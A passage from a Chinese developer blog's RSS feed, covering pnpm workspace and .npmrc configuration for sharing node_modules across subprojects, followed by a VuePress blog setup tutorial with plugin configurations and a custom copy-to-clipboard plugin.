<p>By default, pnpm creates a semistrict <code>node_modules</code> . It means that your dependencies have access to undeclared dependencies but your code does not. With this layout, most of the packages in the ecosystem work with no issues. However, if some tooling only works when the hoisted dependencies are in the root of <code>node_modules</code> , you can set this config to <code>true</code> .</p>
</div>
<h3 id="link-workspace-packages" tabindex="-1"> link-workspace-packages</h3>
<p>这个配置项允许我们在安装依赖项的时候, 将所有的子项目依赖项安装到项目的根目录下, 默认值为 true</p>
<p>上原文的解释</p>
<div><p>原文</p>
<p>Added in: v2.14.0</p>
<ul>
<li>Default: <em>true</em></li>
<li>Type: <em>true</em>, <em>false</em>, <em>deep</em></li>
</ul>
<p>When <code>true</code> , locally available packages are linked to <code>node_modules</code> instead of being downloaded from the registry. This is very convenient in a monorepo. If you need local packages also be linked to subdependencies, you can use the <code>deep</code> setting (since v5).</p>
<p>When <code>false</code> , packages are downloaded and installed from the registry. However, workspace packages can still be linked by using the <code>workspace:</code> range protocol. e.g. <code>pnpm add batman@workspace:*</code> <em>Usage</em></p>
<p>Create a <code>.npmrc</code> file in the root of your monorepo with the following content:</p>
<div><pre><code>link-workspace-packages = true
</code></pre><div aria-hidden="true"><div></div></div></div><p>Create a <code>pnpm-workspace.yaml</code> file with the following content:</p>
<div><pre><code>packages:
  - '**'
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>Run <code>pnpm recursive install</code> .</p>
</div>
<h3 id="registry" tabindex="-1"> registry</h3>
<p>定义了 npm 的下载软件源, 需要注意的是：如果采用私有源的话, 私有源的软件包一定要全, 要和官方源一致（否则在 install 的时候会出现某些依赖项安装失败而出现的问题）</p>
<p>上原文的解释</p>
<div><p>原文</p>
<ul>
<li>Default: <a href="https://registry.npmjs.org/" target="_blank" rel="noopener noreferrer">https://registry.npmjs.org/</a></li>
<li>Type: <em>url</em></li>
</ul>
<p>The base URL of the npm package registry.</p>
</div>
<h2 id="为什么要优化-node-modules" tabindex="-1"> 为什么要优化 node_modules</h2>
<p>最初的 npm 包管理, 是全局共享的, 类似 java 的 maven 仓库, 但是由于前端的 npm 包是经常修改和重新发布的, 这就涉及到一个包版本问题, 不同的项目有可能依赖不同版本的包, 所以 npm 后续版本把仓库独立到各自工程去了, 这样处理最明显的坏处是：</p>
<ul>
<li>每次都需要安装依赖, 费流量, 网速慢时很费时间</li>
<li>浪费磁盘空间, 每个 node_modules 中包含的工具很多, 动辄 200M</li>
</ul>
<p>而好处是：</p>
<ul>
<li>使用 package.json 安装好之后, node_modules 文件夹中没有版本信息, 删掉 package.json 也不会有任何影响。</li>
<li>移动/复制/打包项目比较简单, 对于开发、部署都有好处</li>
<li>对于设计 npm 的人来说, 这是最省事的包依赖方法。这就好比 maven 安装依赖之后自动将 jar 包安装到项目的 lib 里面。</li>
<li>随意改代码。安装在 node_modules 里面的东西, 你可以随便改, 无需担心对其它项目的影响。在 Java 中使用 maven 管理项目时, 如果想要定制某个库, 就需要更改这个库的源代码,</li>
<li>这时就需要把这个库的源代码复制到项目中, 跟 node_modules 是一个道理。npm 的设计者大概认为：前端都是经常修改库的源代码的。</li>
</ul>
<h2 id="解决思路和方案" tabindex="-1"> 解决思路和方案</h2>
<p>我们采用 pnpm 的最终就是为了能够解决多个工程下共用一个 node_modules, 并且能够提升我们的 install 速度, 这里采用到的是 pnpm 中 pnpm workspace 这一特性, 这一特性允许我们将子工程的依赖项全部安装到同一个目录下, 而且会保留子工程中的所依赖的不同版本</p>
<p>准备一个项目工程, 工程目录结构如下</p>
<div><pre><code>--- test-project
  |
  |- common
  |
  |- project1
  |
  |- project2
  |
  |- project3
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>依据 pnpm 中 <a href="https://pnpm.js.org/en/workspaces" target="_blank" rel="noopener noreferrer">pnpm workspace</a> 这一特性, 需要我们指定哪一个目录是 pnpm 工作区的根目录, 还必须在这个根目录下提供 pnpm-workspace.yaml, 注意.npmrc 文件不是必须的, 如果没有这个文件 pnpm 会按照它默认的配置为我们安装依赖项, 我们需要指定 pnpm 的 stor 目录以及 virtual-store 目录以及其他的一些配置, 所以才创建了这个文件</p>
<p>这边找到的不采用工作区的缺点, 假设我们的子工程下的同一个依赖项有着不同的版本号, 于是在子工程中执行 pnpm install 的时候, pnpm 会将依赖项安装到指定目录下, 但是两个工程的 virtual-store 目录 是一致的话, 并不能成功的安装多个版本的依赖项（pnpm 为采用最新的版本依赖项, 而将旧版本的依赖项进行删除, 最后导致旧版本的依赖项链接失败）, 而采用了工作区正好可以解决这一个问题, 它会在工作区的根下创建一个锁文件, 这个锁文件包含了工程下的所有依赖项信息, 每一个工程的依赖项信息都是独立的</p>
<p>我们指定 common 文件夹即是 pnpm 工作区的跟路径, 在这个文件夹里面创建 pnpm-workspace.yaml 和 .npmrc 文件</p>
<div><pre><code><span>packages</span><span>:</span>
  <span>-</span> <span>"../**/"</span> <span># 允许安装上一级目录下的所有工程的依赖</span>
  <span>-</span> <span>"!../**/node_modules/**"</span> <span># 不允许安装 上一级目录下 node_modules 下的依赖项</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>然后我们还需要对 <code>.npmrc</code> 文件进行一定的配置, 配置如下</p>
<div><pre><code>link-workspace-packages = true  # 告诉 pnpm 如何去下载工作区的依赖项
shamefully-hoist = true # 告诉 pnpm 不采用半严格的 node_modules 目录结构
store-dir= .pnpm-store # 所有软件包保存在磁盘上的位置
virtual-store-dir= node_modules/.pnpm #  项目的所有直接和间接依赖关系都链接到此目录
package-import-method= auto # 依赖包从 store 中导入的方式
registry = https://registry.npm.taobao.org
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>然后我们在 common 文件目录下执行 pnpm install, 之后我们观察到子工程中的 node_modules 目录的大小实际不到 100kb, common 目录下的 node_modules 也在 300M 到 500M, 其余 i 的依赖项大多数都是链接到 common 文件夹下的 node_modules/.pnpm 这个目录</p>
<p>但是, 在运行 npm run serve 的时候, 继而发现了一个严峻的问题</p>
<p>比如在 <code>babel.config.js</code> 中配置了 <code>@babel/preset-env</code> 这一个配置项, 然而在 <code>package.json</code> 中并没有此项依赖, 在该工程的 node_modules 下也没有找到它的链接</p>
<p>接着尝试在子工程中也创建 <code>.npmrc</code> 这个文件, 文件内容如下</p>
<div><pre><code>store-dir= ../common/.pnpm-store # 所有软件包保存在磁盘上的位置, 需要指向 common 目录
virtual-store-dir= ../common/node_modules/.pnpm #  项目的所有直接和间接依赖关系都链接到此目录, 需要指向 common 目录
package-import-method= auto # 依赖包从 store 中导入的方式
registry = https://registry.npm.taobao.org
shamefully-hoist = true # 告诉 pnpm 不采用半严格的 node_modules 目录结构
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>然后再次在子工程中执行 pnpm install, 之后我们观察到子工程中的 node_modules 目录的大小会适当的加大了几百 kb, 因为我们又为子工程安装了一些链接不到的依赖项, 这一操作是为了安装子工程中没有链接到 common 目录下的依赖包, 不过不用担心, 在第一个子工程中执行的时候会比较耗时, 大概在 1~2 分钟, 然后在其他的子工程中再次执行的时候, 几乎不占时间的为子工程创建链接（除非这个依赖项在 common 中找不到）</p>
<p>这里需要注意的是 common 下面配置的 registry 和子工程下配置的 registry 是需要一致的, 否则 pnpm 为我们安装不同软件源的依赖项, 这一过程是多余的</p>
]]></content:encoded>
    </item>
    <item>
      <title>使用 vuepress 更新我的博客</title>
      <link>https://vxhly.github.io/views/nodejs/vuepress-blog-on-github.html</link>
      <guid>https://vxhly.github.io/views/nodejs/vuepress-blog-on-github.html</guid>
      <source url="https://vxhly.github.io/rss.xml">使用 vuepress 更新我的博客</source>
      <description>前言
嗯～, 没错, 博客又迎来一次重大的更新, 此次更新不再采用 hexo 这个静态博客解决方案, 将采用 vuepress 这一静态博客解决方案。本博文将会从搭建博客到部署上线进行较详细的介绍。

</description>
      <category>nodejs</category>
      <pubDate>Mon, 28 Oct 2019 16:14:34 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>嗯～, 没错, 博客又迎来一次重大的更新, 此次更新不再采用 hexo 这个静态博客解决方案, 将采用 vuepress 这一静态博客解决方案。本博文将会从搭建博客到部署上线进行较详细的介绍。</p>
</div>

<h2 id="开始你的博客" tabindex="-1"> 开始你的博客</h2>
<h3 id="前期准备" tabindex="-1"> 前期准备</h3>
<p><a href="https://vuepress.vuejs.org/zh/plugin/" target="_blank" rel="noopener noreferrer">VuePress 官方文档</a>, 不管怎样这份文档多多少少都得阅读一遍吧</p>
<p><a href="https://vuepress-theme-reco.recoluan.com/" target="_blank" rel="noopener noreferrer">vuepress-theme-reco 博客主题文档</a>, 如果你用的博客主题和我的一样的话, 这份文档也该阅读一遍吧, 如果不是的话或是你找到了更加优秀主题的话请你私信给我</p>
<h3 id="安装博客主题-cli" tabindex="-1"> 安装博客主题 CLI</h3>
<div><pre><code><span>npm</span> i -g vuepress <span># 如果可以的话, 建议您 vuepress 可以全局安装一下依赖, 当然不装也没啥大问题</span>
<span>npm</span> <span>install</span> @vuepress-reco/theme-cli -g
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="创建一份基础的-demo" tabindex="-1"> 创建一份基础的 DEMO</h3>
<p>命令行会已一问一答的方式指引你创建一份新的博客, 按照提示进行配置即可</p>
<div><pre><code>theme-cli init my-blog
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="安装依赖" tabindex="-1"> 安装依赖</h3>
<div><pre><code><span>cd</span> my-blog
<span>npm</span> <span>install</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="预览" tabindex="-1"> 预览</h3>
<p>这一步可分为开发模式预览和线上模式预览。 开发模式预览指未发布前自己个儿边写博文边看效果（PS：可自动刷新浏览器）；线上模式预览指准备发布了,打包之后查看线上的效果</p>
<h4 id="开发模式预览" tabindex="-1"> 开发模式预览</h4>
<div><pre><code><span>npm</span> dev <span># 打开浏览器即可浏览, 网址: 127.0.0.1:8080</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="线上模式预览" tabindex="-1"> 线上模式预览</h4>
<div><pre><code><span>npm</span> build
server public <span># 需要提前安装 serve（开启本地的一个服务器, 执行命令 npm i -g serve）</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="新的一篇文章" tabindex="-1"> 新的一篇文章</h2>
<div><p>提示</p>
<p>该博客主题 CLI 没有像 hexo 的 CLI 一样提供创建文章的功能, 所以在此自己就撸了个 CLI 工具, 有需要的向下看</p>
</div>
<p>上 GitHub 地址: <a href="https://github.com/vxhly/vuepress-article-cli" target="_blank" rel="noopener noreferrer">vuepress-article-cli</a></p>
<h3 id="安装-cli-工具" tabindex="-1"> 安装 CLI 工具</h3>
<div><pre><code><span>npm</span> i vuepress-article-cli -g
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="使用" tabindex="-1"> 使用</h3>
<p>新建一篇文章</p>
<div><pre><code>va-cli new
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/nodejs-cli-1.png" alt="nodejs-cli"></p>
<p>批量删除文章</p>
<div><pre><code>va-cli del
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/nodejs-cli-2.png" alt="nodejs-cli"></p>
<p>创建模版文件</p>
<div><pre><code>va-cli tmp
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/nodejs-cli-3.png" alt="nodejs-cli"></p>
<h2 id="进阶配置" tabindex="-1"> 进阶配置</h2>
<p>经过上面的一系列折腾, 就能开始使用 VuePress 这个博客了</p>
<div><p>提示</p>
<p>以下只提供 <a href="https://vuepress-theme-reco.recoluan.com/" target="_blank" rel="noopener noreferrer">vuepress-theme-reco 博客主题文档</a> 中未提及的配置项</p>
</div>
<h3 id="last-updated" tabindex="-1"> last-updated</h3>
<div><p>注意</p>
<p>无需重新按照该插件, 直接进入配置即可, 这个插件也可不进行配置, 至于为啥要在本博文中写出（PS： 默认显示的时间格式可读性比较差, 所以需要进行格式化一下）</p>
</div>
<p>显示最后的更新时间插件, 先上插件文档 <a href="https://vuepress.vuejs.org/zh/plugin/official/plugin-last-updated.html" target="_blank" rel="noopener noreferrer">@vuepress/last-updated</a></p>
<p>再上配置, <code>/.vuepress/config.js</code></p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>plugins</span><span>:</span> <span>[</span>
    <span>[</span>
      <span>"@vuepress/last-updated"</span><span>,</span>
      <span>{</span>
        <span>transformer</span><span>:</span> <span>(</span><span>timestamp<span>,</span> lang</span><span>)</span> <span>=></span> <span>{</span>
          <span>// 不要忘了安装 moment</span>
          <span>// moment 时间格式化文档戳这里 http://momentjs.cn/</span>
          <span>const</span> moment <span>=</span> <span>require</span><span>(</span><span>"moment"</span><span>)</span><span>;</span>
          moment<span>.</span><span>locale</span><span>(</span>lang<span>)</span><span>;</span>
          <span>return</span> <span>moment</span><span>(</span>timestamp<span>)</span><span>.</span><span>fromNow</span><span>(</span><span>)</span><span>;</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="medium-zoom" tabindex="-1"> medium-zoom</h3>
<div><p>注意</p>
<p>无需重新按照该插件, 直接进入配置即可</p>
</div>
<p>插件大图预览, 先上插件文档 <a href="https://vuepress.vuejs.org/zh/plugin/official/plugin-pwa.html" target="_blank" rel="noopener noreferrer">@vuepress/medium-zoom</a></p>
<p>再上配置, <code>/.vuepress/config.js</code></p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
    <span>plugins</span><span>:</span> <span>[</span>
        <span>[</span><span>'@vuepress/medium-zoom'</span><span>:</span> <span>{</span>
            <span>selector</span><span>:</span> <span>".page img"</span><span>,</span>
            <span>options</span><span>:</span> <span>{</span>
                <span>margin</span><span>:</span> <span>16</span><span>,</span>
                <span>background</span><span>:</span> <span>"#202124de"</span><span>,</span>
                <span>scrollOffset</span><span>:</span> <span>0</span>
            <span>}</span>
        <span>}</span><span>]</span>
    <span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="pwa" tabindex="-1"> pwa</h3>
<div><p>注意</p>
<p>你的 VPS 服务器必须支持 HTTPS, 否则 PWA 将会失效, 当然如果你和我一样使用 GitHub 的 pages 服务的话, 就无须担心这一点<br> 必须重新依赖该插件, 否则尽管配置了也不会加载 pwa</p>
</div>
<p>插件 PWA（PS：关于 PWA 的知识戳这里 <a href="https://lavas.baidu.com/pwa" target="_blank" rel="noopener noreferrer">PWA</a>）, 先上插件文档 <a href="https://vuepress.vuejs.org/zh/plugin/official/plugin-pwa.html" target="_blank" rel="noopener noreferrer">@vuepress/pwa</a></p>
<p>按照文档中的步骤来, 第一：在 <code>.vuepress/public</code> 提供 <code>Manifest</code> 和 <code>icons</code></p>
<p>一份 <code>manifest.json</code> 的例子</p>
<div><pre><code><span>{</span>
  <span>"name"</span><span>:</span> <span>"Coding and Fixing"</span><span>,</span>
  <span>"short_name"</span><span>:</span> <span>"Coding and Fixing"</span><span>,</span>
  <span>"start_url"</span><span>:</span> <span>"./index.html"</span><span>,</span>
  <span>"display"</span><span>:</span> <span>"fullscreen"</span><span>,</span>
  <span>"background_color"</span><span>:</span> <span>"#000000"</span><span>,</span>
  <span>"theme_color"</span><span>:</span> <span>"#22979b"</span><span>,</span>
  <span>"icons"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"src"</span><span>:</span> <span>"./icons/android-chrome-192x192.png"</span><span>,</span>
      <span>"sizes"</span><span>:</span> <span>"192x192"</span><span>,</span>
      <span>"type"</span><span>:</span> <span>"image/png"</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>"src"</span><span>:</span> <span>"./icons/android-chrome-512x512.png"</span><span>,</span>
      <span>"sizes"</span><span>:</span> <span>"512x512"</span><span>,</span>
      <span>"type"</span><span>:</span> <span>"image/png"</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>"src"</span><span>:</span> <span>"./icons/apple-touch-icon-60x60.png"</span><span>,</span>
      <span>"sizes"</span><span>:</span> <span>"60x60"</span><span>,</span>
      <span>"type"</span><span>:</span> <span>"image/png"</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>"src"</span><span>:</span> <span>"./icons/apple-touch-icon-76x76.png"</span><span>,</span>
      <span>"sizes"</span><span>:</span> <span>"76x76"</span><span>,</span>
      <span>"type"</span><span>:</span> <span>"image/png"</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>"src"</span><span>:</span> <span>"./icons/apple-touch-icon-120x120.png"</span><span>,</span>
      <span>"sizes"</span><span>:</span> <span>"120x120"</span><span>,</span>
      <span>"type"</span><span>:</span> <span>"image/png"</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>"src"</span><span>:</span> <span>"./icons/apple-touch-icon-152x152.png"</span><span>,</span>
      <span>"sizes"</span><span>:</span> <span>"152x152"</span><span>,</span>
      <span>"type"</span><span>:</span> <span>"image/png"</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>"src"</span><span>:</span> <span>"./icons/apple-touch-icon-180x180.png"</span><span>,</span>
      <span>"sizes"</span><span>:</span> <span>"180x180"</span><span>,</span>
      <span>"type"</span><span>:</span> <span>"image/png"</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>"src"</span><span>:</span> <span>"./icons/msapplication-icon-144x144.png"</span><span>,</span>
      <span>"sizes"</span><span>:</span> <span>"144x144"</span><span>,</span>
      <span>"type"</span><span>:</span> <span>"image/png"</span>
    <span>}</span>
  <span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>接下来就是 <code>icons</code> 了, 根据你配置的 <code>manifest.json</code> 进行裁剪图标即可</p>
<p>第二：在 <code>.vuepress/config.js</code> 中添加配置（PS：该步骤略过, 文档中已经提供了）</p>
<p>部署之后, 你会神奇的发现在你浏览器地址栏的右边出现了一个 <code>+</code> 号的图标, 小主可点击本博客上的 <code>+</code> 号的图标查看效果</p>
<h3 id="copyright" tabindex="-1"> copyright</h3>
<div><p>注意</p>
<p>必须重新依赖该插件, 否则尽管配置了也不会加载</p>
</div>
<p>指定页面复制行为的插件, 先上插件文档 <a href="https://vuepress.github.io/zh/plugins/copyright/#vuepress-plugin-copyright" target="_blank" rel="noopener noreferrer">vuepress-plugin-copyright</a></p>
<p>再上配置, <code>/.vuepress/config.js</code></p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>plugins</span><span>:</span> <span>[</span>
    <span>[</span>
      <span>"copyright"</span><span>,</span>
      <span>{</span>
        <span>// 更多配置项以及配置项说明上 https://github.com/vuepress/vuepress-plugin-copyright 查看</span>
        <span>noCopy</span><span>:</span> <span>true</span><span>,</span>
        <span>minLength</span><span>:</span> <span>150</span><span>,</span>
        <span>disabled</span><span>:</span> <span>false</span><span>,</span>
        <span>noSelect</span><span>:</span> <span>true</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="clipboard-copy" tabindex="-1"> clipboard-copy</h3>
<div><p>提示</p>
<p>此插件纯粹是自己为了配合上一个插件自己写的一份一键复制插件, 暂未发布, 下面贴出代码供米娜桑参考（PS：效果米娜桑可以对下面的代码进行一键复制即可看到）</p>
</div>
<p><code>clipboard-copy.js</code></p>
<div><pre><code><span>const</span> <span>{</span> resolve <span>}</span> <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>

module<span>.</span><span>exports</span> <span>=</span> <span>(</span><span>options<span>,</span> context</span><span>)</span> <span>=></span> <span>(</span><span>{</span>
  <span>define</span><span>:</span> <span>{</span>
    <span>COPY_SELECTOR</span><span>:</span> options<span>.</span>copy_selector <span>||</span> <span>'div[class*="language-"] pre'</span><span>,</span>
    <span>COPY_ASIDE</span><span>:</span> options<span>.</span>copy_selector <span>||</span> <span>'div[class*="aside-code"] aside'</span><span>,</span>
  <span>}</span><span>,</span>
  <span>clientRootMixin</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>"clientRootMixin.js"</span><span>)</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>clientRootMixin.js</code></p>
<div><pre><code><span>import</span> <span>"./style.css"</span><span>;</span>

<span>import</span> <span>{</span> message <span>}</span> <span>from</span> <span>"ant-design-vue"</span><span>;</span>
<span>import</span> <span>"ant-design-vue/lib/message/style/css"</span><span>;</span>
message<span>.</span><span>config</span><span>(</span><span>{</span>
  <span>top</span><span>:</span> <span><span>`</span><span>100px</span><span>`</span></span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>zoom</span><span>:</span> <span>null</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>

  <span>mounted</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>updateCopy</span><span>(</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>

  <span>updated</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>updateCopy</span><span>(</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>

  <span>methods</span><span>:</span> <span>{</span>
    <span>updateCopy</span><span>(</span><span>)</span> <span>{</span>
      <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
        document
          <span>.</span><span>querySelectorAll</span><span>(</span><span>COPY_SELECTOR</span><span>)</span>
          <span>.</span><span>forEach</span><span>(</span><span>this</span><span>.</span>generateCopyButton<span>)</span><span>;</span>
        document<span>.</span><span>querySelectorAll</span><span>(</span><span>COPY_ASIDE</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>this</span><span>.</span>generateCopyButton<span>)</span><span>;</span>
      <span>}</span><span>,</span> <span>1000</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>generateCopyButton</span><span>:</span> <span>function</span> <span>(</span><span>parent</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>parent<span>.</span>classList<span>.</span><span>contains</span><span>(</span><span>"codecopy-enabled"</span><span>)</span><span>)</span> <span>return</span><span>;</span>
      <span>const</span> copyElement <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"span"</span><span>)</span><span>;</span>
      copyElement<span>.</span>className <span>=</span> <span>"code-copy iconfont reco-api"</span><span>;</span>
      copyElement<span>.</span>title <span>=</span> <span>"Click to Copy to Clipboard"</span><span>;</span>
      copyElement<span>.</span><span>addEventListener</span><span>(</span><span>"click"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
        <span>this</span><span>.</span><span>copyToClipboard</span><span>(</span>parent<span>.</span>innerText<span>)</span><span>;</span>
      <span>}</span><span>)</span><span>;</span>
      parent<span>.</span><span>appendChild</span><span>(</span>copyElement<span>)</span><span>;</span>
      parent<span>.</span>classList<span>.</span><span>add</span><span>(</span><span>"codecopy-enabled"</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>copyToClipboard</span><span>:</span> <span>function</span> <span>(</span><span>str</span><span>)</span> <span>{</span>
      <span>const</span> el <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"textarea"</span><span>)</span><span>;</span>
      el<span>.</span>value <span>=</span> str<span>;</span>
      el<span>.</span><span>setAttribute</span><span>(</span><span>"readonly"</span><span>,</span> <span>""</span><span>)</span><span>;</span>
      el<span>.</span>style<span>.</span>position <span>=</span> <span>"absolute"</span><span>;</span>
      el<span>.</span>style<span>.</span>left <span>=</span> <span>"-9999px"</span><span>;</span>
      document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>el<span>)</span><span>;</span>
      <span>const</span> selected <span>=</span>
        document<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span>rangeCount <span>></span> <span>0</span>
          <span>?</span> document<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span><span>getRangeAt</span><span>(</span><span>0</span><span>)</span>
          <span>:</span> <span>false</span><span>;</span>
      el<span>.</span><span>select</span><span>(</span><span>)</span><span>;</span>
      document<span>.</span><span>execCommand</span><span>(</span><span>"copy"</span><span>)</span><span>;</span>
      message<span>.</span><span>success</span><span>(</span><span>"复制成功,快去粘贴使用吧 !!!"</span><span>)</span><span>;</span>
      document<span>.</span>body<span>.</span><span>removeChild</span><span>(</span>el<span>)</span><span>;</span>
      <span>if</span> <span>(</span>selected<span>)</span> <span>{</span>
        document<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span><span>removeAllRanges</span><span>(</span><span>)</span><span>;</span>
        document<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span><span>addRange</span><span>(</span>selected<span>)</span><span>;</span>
      <span>}</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>style.css</code></p>
<div><pre><code><span>.code-copy</span> <span>{</span>
  <span>color</span><span>:</span> #aaa<span>;</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
  <span>cursor</span><span>:</span> pointer<span>;</span>
<span>}</span>

<span>div[class*="language-"] pre .code-copy,
div[class*="aside-code"] aside .code-copy</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>z-index</span><span>:</span> 1000<span>;</span>
  <span>top</span><span>:</span> 5px<span>;</span>
  <span>right</span><span>:</span> 40px<span>;</span>
  <span>opacity</span><span>:</span> 0<span>;</span>
  <span>font-size</span><span>:</span> 16px<span>;</span>
<span>}</span>

<span>div[class*="language-"] pre:hover .code-copy,
div[class*="aside-code"] aside:hover .code-copy</span> <span>{</span>
  <span>opacity</span><span>:</span> 1<span>;</span>
<span>}</span>

<span>.content pre,
.content pre[class*="language-"]</span> <span>{</span>
  <span>overflow-y</span><span>:</span> hidden<span>;</span>
<span>}</span>

<span>div[class*="language-"] pre,
div[class*="language-"] pre[class*="language-"]</span> <span>{</span>
  <span>position</span><span>:</span> static <span>!important</span><span>;</span>
<span>}</span>

<span>div[class~="language-text"]:before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"text"</span><span>;</span>
<span>}</span>

<span>div[class~="language-yml"]:before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"yml"</span><span>;</span>
<span>}</span>

<span>div[class*="language-"] pre</span> <span>{</span>
  <span>user-select</span><span>:</span> text<span>;</span>
<span>}</span>

<span>p code</span> <span>{</span>
  <span>user-select</span><span>:</span> all<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="nest" tabindex="-1"> nest</h3>
<div><p>提示</p>
<p>自己个写的对接 <a href="https://github.com/hustcc/canvas-nest.js" target="_blank" rel="noopener noreferrer">canvas-nest.js</a> 的一个插件</p>
</div>
<p>页面 canvas-nest 背景插件, 先上插件文档 <a href="https://github.com/vxhly/vuepress-plugin-nest" target="_blank" rel="noopener noreferrer">vuepress-plugin-nest</a></p>
<p>再上配置, <code>/.vuepress/config.js</code></p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>plugins</span><span>:</span> <span>[</span>
    <span>[</span>
      <span>"nest"</span><span>,</span>
      <span>{</span>
        <span>// 更多配置项以及配置项说明上 https://github.com/vxhly/vuepress-plugin-nest 查看</span>
        <span>color</span><span>:</span> <span>"255,0,255"</span><span>,</span>
        <span>count</span><span>:</span> <span>100</span><span>,</span>
        <span>opacity</span><span>:</span> <span>0.7</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="sitemap" tabindex="-1"> sitemap</h3>
<div><p>注意</p>
